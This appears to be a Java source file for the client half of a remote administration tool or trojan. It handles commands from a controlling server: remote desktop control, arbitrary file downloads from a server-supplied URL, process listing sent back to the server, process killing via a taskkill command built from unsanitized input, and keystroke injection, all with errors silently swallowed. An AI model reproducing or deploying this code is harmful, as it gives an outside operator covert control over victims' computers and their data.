package com.poc.net;

import java.awt.Robot;
import java.io.BufferedReader;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.net.URISyntaxException;
import java.net.URL;
import java.nio.channels.Channels;
import java.nio.channels.ReadableByteChannel;
import java.util.ArrayList;

import javax.swing.JOptionPane;

import com.poc.packet.Packet;
import com.poc.packet.Packet10Kill;
import com.poc.packet.Packet11SendKeys;
import com.poc.packet.Packet2Disconnect;
import com.poc.packet.Packet3RequestRC;
import com.poc.packet.Packet5Message;
import com.poc.packet.Packet6Url;
import com.poc.packet.Packet7Download;
import com.poc.packet.Packet8Tasks;
import com.poc.packet.Packet9RefreshTasks;

public class PacketManager {

	private final ClientManager clientManager;
	
	public PacketManager(ClientManager clientManager) {
		this.clientManager = clientManager;
	}
	
	public void handlePacket(Packet packet) {
		if (packet instanceof Packet2Disconnect) {
			clientManager.getWriteManager().writeToServerTCP(new Packet2Disconnect());
			clientManager.getClient().close();
		} else if (packet instanceof Packet3RequestRC) {
			if (!clientManager.getRCManager().isControlling())
				clientManager.getRCManager().startRemoteControl();
		} else if (packet instanceof Packet5Message) {
			JOptionPane.showMessageDialog(null, ((Packet5Message) packet).message);
		} else if (packet instanceof Packet6Url) {
			if(java.awt.Desktop.isDesktopSupported()) {
				java.awt.Desktop desktop = java.awt.Desktop.getDesktop();
				if(desktop.isSupported( java.awt.Desktop.Action.BROWSE)) {
					try {
						java.net.URI uri = new java.net.URI(((Packet6Url) packet).url);
						desktop.browse(uri);
					} catch (Exception e) {
					}
				}
			}
		} else if (packet instanceof Packet7Download) {
			try {
				String url = ((Packet7Download) packet).url;
				String filename = ((Packet7Download) packet).filename;
				URL website = new URL(url);
			    ReadableByteChannel rbc = Channels.newChannel(website.openStream());
			    FileOutputStream fos = new FileOutputStream(filename);
			    fos.getChannel().transferFrom(rbc, 0, 1 << 24);
			    fos.close();
			    rbc.close();
			} catch (Exception e) {
			}
		} else if (packet instanceof Packet9RefreshTasks) {
			refresh();
		} else if (packet instanceof Packet10Kill) {
			try {
				Packet10Kill p10 = (Packet10Kill) packet;
				Runtime.getRuntime().exec("taskkill /IM " + p10.task + ".exe");
				refresh();
			} catch (Exception e) {
			}
		} else if (packet instanceof Packet11SendKeys) {
			try {
				Robot robot = new Robot();
				char[] letters = ((Packet11SendKeys) packet).message.toCharArray();
				for (char c : letters) {
					robot.keyPress((int) c);
					Thread.sleep(100);
				}
			} catch (Exception e) {
			}
		}
	}
	
	private void refresh() {
		try {
			Process p = Runtime.getRuntime().exec("tasklist");
			BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
			ArrayList<String> tasksArray = new ArrayList<String>();
			String line;
			while ((line = reader.readLine()) != null) {
				if (line.contains(".exe")) {
					String newLine = line.substring(0, line.indexOf(".exe"));
					if (!newLine.trim().equalsIgnoreCase("")) {
						tasksArray.add(newLine);
					}
				}
			}
			String[] tasks = new String[tasksArray.size()];
			for (int i = 0; i < tasks.length; i++)
				tasks[i] = tasksArray.get(i);
			Packet8Tasks p8 = new Packet8Tasks();
			p8.tasks = tasks;
			clientManager.getWriteManager().writeToServerTCP(p8);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
}
